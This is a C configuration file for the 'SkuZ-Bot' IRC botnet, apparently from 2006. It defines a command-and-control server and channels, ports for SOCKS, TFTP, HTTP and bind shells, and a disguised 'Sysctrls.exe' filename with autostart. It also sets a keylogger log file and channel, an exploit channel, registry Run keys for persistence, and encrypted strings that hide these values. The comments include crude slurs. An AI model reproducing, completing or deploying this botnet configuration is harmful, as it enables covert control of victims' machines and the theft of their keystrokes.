///////////////////////////////////////////////////////////////
//       __ _          _____          _           _          //
//      / _\ | ___   _/ _  /         | |__   ___ | |_        //
//      \ \| |/ / | | \// /   _____  | '_ \ / _ \| __|       //
//      _\ \   <| |_| |/ //\ |_____| | |_) | (_) | |_        //
//      \__/_|\_\\__,_/____/         |_.__/ \___/ \__|       //
//                                                           //
//   ____        _____          ____  _               _  __  //
//  | __ ) _   _|__  /  _ __   / ___|| | _____  _ __ | |/ /  //
//  |  _ \| | | | / /  | '_ \  \___ \| |/ / _ \| '_ \| ' /   //
//  | |_) | |_| |/ /_  | | | |  ___) |   < (_) | | | | . \   //
//  |____/ \__,_/____| |_| |_| |____/|_|\_\___/|_| |_|_|\_\  //
//                                                           //
///////////////////////////////////////////////////////////////
///////////////////SkuZ-Netapi-VNC-IM by xC////////////////////
///////////////////////////////////////////////////////////////

// NICK SETTINGS
int maxrand = 6;
BOOL nickprefix = TRUE;
int nicktype = COUNTRYNICK;  //Refer to Rnd

// PORTS 
int port = 6667;
int port2 = 6668;
int socks4port = 1243;
int tftpport = 69;
int httpport = 2001;
int rloginport = 563;
int bindport = 3169;

// MISC. SETTINGS
BOOL topiccmd = TRUE;
BOOL rndfilename = FALSE;
BOOL AutoStart = TRUE;

// BOT PREFIX
char prefix = '.';

#ifndef NO_CRYPT

// SERVER SETTINGS
char server[] = "\x13\x1E\xD4\x16\x4B\xCC\xE5\x60\xB3\x3A\x4F"; //0.0.0.0
char serverpass[] = "";
char channel[] = "\x07\x54\x98\x48\x1A\x81\xBC\x38\xFE\x69\x06"; //#xCisaho
char chanpass[] = "";
char server2[] = "";
char channel2[] = "";
char chanpass2[] = "";

char nickconst[] = "\x7F\x54\xB9\x79\x56"; //[xCISBITCH]-

// LOGIN PASSWORD
char password[] = "\x16\x18\xC2\x11\x42\xDA\xE5\x67"; //xcsuckshairydick

// BOT FILENAME SETTINGS
char filename[] = "\x77\x55\x89\x47\x0F\x90\xBB\x22\xB3\x69\x06\xCF"; //Sysctrls.exe
char szLocalPayloadFile[]= "\x77\x55\x89\x47\x0F\x90\xBB\x22\xB3\x68\x1F\xDE"; //Sysctrls.dat
char logfile[]= "\x77\x55\x89\x47\x0F\x90\xBB\x22\xB3\x78\x06\xDE"; //Sysctrls.txt

// BOT CONFIGURATION
char botid[] = "\x77\x55\x89\x47\x0F\x90\xBB\x22"; //Sysctrls
char version[] = "\x77\x47\x8F\x7E\x56\xAC\xB2\x25\xFC\x7C\x17\x87\x78\x4A\xEC\xE5\xF6\xA2\x26\xC5\xD4\xFE\xF4\x04"; //SkuZ-Netapi-VNC-IM by xC
char modeonconn[] = "\x0F\x54";
char chanmode[] = "\x0F\x5F\x97\x4A\x0F\x92";

// EXPLOIT CHANNEL
char exploitchan[] = "\x07\x54\x98\x48\x1A\x81\xBC\x38\xFE\x69\x06";//#xcLicksdick
#ifndef NO_KEYLOG
char keylogfile[] = "\x77\x55\x89\x47\x0F\x90\xBB\x22\xB3\x65\x10\xC3"; //Sysctrls.ini
char keylogchan[] = "\x07\x54\x98\x48\x1A\x81\xBC\x38\xFE\x69\x06"; //#xcSmellslikekoochie
#endif

// MASTER HOST
char *authost[] = {
	"\x0E\x6C\xD0" //*@* (All)
};

// FAKE VERSION LIST
char *versionlist[] = {
	"\x40\x43\x94\x50\x1D\x97\xBC\x26\xF4\x78\x16\xC7\x4B\x6B\xDD\xBB\xD4\x80\x68\xCC"
};

// REGISTRY SETTINGS
char valuename[] = "\x77\x55\x89\x47\x0F\x90\xBB\x22"; //Sysctrls
char regkey1[]="\x77\x43\x9C\x50\x0C\x83\xA5\x34\xC1\x50\x33\xC3\x4D\x76\xC0\xBB\xD0\x89\x72\xFB\xF1\x89\xE5\x29\xA9\x3A\xAC\x82\xA4\x4D\x52\xE9\x84\xAD\xD1\xB2\x87\xCE\x96\xA4\x03\xA0\xA1\x5F\x68\x94\x38\xF3\x93";
char regkey2[]="\x77\x43\x9C\x50\x0C\x83\xA5\x34\xC1\x50\x33\xC3\x4D\x76\xC0\xBB\xD0\x89\x72\xFB\xF1\x89\xE5\x29\xA9\x3A\xAC\x82\xA4\x4D\x52\xE9\x84\xAD\xD1\xB2\x87\xCE\x96\xA4\x03\xA0\xA1\x5F\x68\x94\x38\xF3\x93\xA8\x34\xC2\x71\xDD\xFE\x98\xC9";
char regkey3[]="\x77\x43\x9C\x50\x0C\x83\xA5\x34\xC1\x50\x33\xC3\x4D\x76\xC0\xBB\xD0\x89\x72\xFB\xF1\x91\xC0\x02";
char regkey4[]="\x77\x75\xA9\x70\x3E\xAF\x8B\x0D\xDE\x79\x0C\xD8\x4B\x6A\xDB\x8B\xD0\x81\x72\xD5\xC2\xB2\xDF\x22\xB9\x09\x87\xB2\x97\x7F\x65\xEE\x99\xB3\xE8\x80\xBF\xEB\x92";

#endif
/////////////////////////////////////////////////
//       SkuZ-Bot-V.1-2006    By Skonk & BuZ   //
///////////////////////////////////////////////// 